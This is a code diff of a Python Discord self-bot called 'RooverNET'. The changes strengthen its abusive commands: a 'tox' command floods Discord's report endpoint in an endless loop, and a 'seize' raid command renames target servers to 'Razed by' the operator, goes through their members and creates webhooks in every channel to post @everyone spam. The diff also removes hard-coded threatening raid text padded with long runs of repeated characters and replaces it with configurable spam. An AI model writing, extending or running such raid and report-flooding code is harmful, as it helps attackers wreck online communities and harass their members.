@@ -31,24 +31,13 @@ if os.name == "nt":
 ###################################################
 # Bot Panel #
 ##################################################
-def clese():
-  if sys.platform == "linux":
-        os.system('clear')
-  elif sys.platform == "linux2":
-        os.system('clear')
-  elif sys.platform == "win32":
-        os.system('cls')
-  elif sys.platform == "darwin":
-        os.system('clear')
-  elif sys.platform == "cygwin":
-        os.system('cls') 
-  else:
-    pass
-  
 with open('user.json') as userjs:
     userjson = json.load(userjs)
+    global sned
+    sned = userjson.get('spam')
     global prefix
     prefix = userjson.get('prefix')
+    global status
     status = userjson.get("status")
     global hook
     hook = False
@@ -66,6 +55,7 @@ ments=discord.AllowedMentions(
 intents = discord.Intents().all()
 roover = commands.Bot(self_bot=True, intents=intents, command_prefix=commands.when_mentioned_or(prefix), case_insensitive=True,  strip_after_prefix=True, allowed_mentions=ments)
 token = os.getenv('TOKEN')
+userp = os.getenv('USER')
 """rme = roover.cached_messages
   for re in rme:
     print(re)"""
@@ -88,12 +78,12 @@ async def on_ready():
     elif stat == "false":
       pass
     else:
-      clese()
+      os.system("cls" if os.name == "nt" else "clear")
       print(f"\nCritical error encountered. Invalid user input entered.\nJson values can only be true or false.")
       os._exit(4)
   except Exception as e:
     handler(e).efilter()
-    os._exit(5) #wouldn't this just exit upon error?
+    os._exit(5)
   time.sleep(1.5)
   while True:
       fuck = await aioconsole.ainput(f"""\n{coloring.BLUE}┌──{coloring.BLUE}「{coloring.RED}{user}[Ω]RooverNET{coloring.BLUE}」-[{coloring.YELLOW}!{coloring.BLUE}]{coloring.WHITE}:{coloring.BLUE}
@@ -185,7 +175,7 @@ async def credits(ctx):
         em.set_footer(text="𝗠𝗮𝗱𝗲 𝗯𝘆 𝗥𝗼𝗼𝘃𝗲𝗿 𝗮𝗻𝗱 𝗦𝗵𝗲𝗹𝗹")
         await ctx.send(embed=em, delete_after=60)
 ###################################################
-@roover.command(title="Tox")
+@roover.command(title="Tox", description="Shitty massreport that will never work :).")
 async def tox(ctx, msgid):
     await ctx.message.delete()
     headers = {
@@ -201,10 +191,12 @@ async def tox(ctx, msgid):
     'message_id': msgid,
     'reason': reason
     }
-    try:
-      requests.post(f"https://discord.com/api/v9/report", headers=headers, json=payload)
-    except:
-      handler(e).efilter()
+    while True:
+      try:
+        httpx.post(f"https://discord.com/api/v9/report", headers=headers, json=payload)
+      except Exception as e:
+        handler(e).efilter()
+        break
 ###################################################
 @roover.command(name="Uncache", description="Fully resets the bot and errorcache.")
 @commands.cooldown(1, 30)
@@ -338,7 +330,7 @@ async def seize(ctx, sid=None):
     except: 
       pass
     try:
-      await ctx.guild.edit(name=f"Razed by Roover | {ctx.guild.name}")
+      await ctx.guild.edit(name=f"Razed by {userp} | {ctx.guild.name}")
     except:
       pass
     for member in ctx.guild.members:
@@ -352,12 +344,12 @@ async def seize(ctx, sid=None):
       except:
         pass
     for chany in ctx.guild.channels:
-        webhook = await chany.create_webhook(name="Roover")
+        webhook = await chany.create_webhook(name={userp})
         webhook_url = webhook.url
         async with aiohttp.ClientSession() as session:
             webhook = Webhook.from_url(str(webhook_url), adapter=AsyncWebhookAdapter(session))
             for i in range(1):
-              await webhook.send("@everyone **This server has been seized by thy Roover of the United Kingnites of the Krown. Any atempts to rebuild will be met by the same result. Death to N and M Grade, death to The Coalition, Long Live Roover.** ﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽https://media.discordapp.net/attachments/878426983107797035/902251430461714473/unknown.png?width=180&height=180")
+              await webhook.send(sned)
   else:
     guild = roover.get_guild(int(sid))
     for channel in guild.channels:
@@ -371,7 +363,7 @@ async def seize(ctx, sid=None):
     except: 
       pass
     try:
-      await guild.edit(name=f"Razed by Roover | {guild.name}")
+      await guild.edit(name=f"Razed by {userp} | {guild.name}")
     except:
       pass
     for member in guild.members:
@@ -385,12 +377,12 @@ async def seize(ctx, sid=None):
       except:
         pass
     for chany in guild.channels:
-        webhook = await chany.create_webhook(name="Roover")
+        webhook = await chany.create_webhook(name={userp})
         webhook_url = webhook.url
         async with aiohttp.ClientSession() as session:
             webhook = Webhook.from_url(str(webhook_url), adapter=AsyncWebhookAdapter(session))
             for i in range(1):
-              await webhook.send("@everyone **This server has been seized by thy Roover of the United Kingnites of the Krown. Any atempts to rebuild will be met by the same result. Death to N and M Grade, death to The Coalition, Long Live Roover.** ﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽https://media.discordapp.net/attachments/878426983107797035/902251430461714473/unknown.png?width=180&height=180")
+              await webhook.send(sned)
 
 @roover.command(name="Rspam", description="Spams roles in a server")
 @commands.cooldown(1, 13)
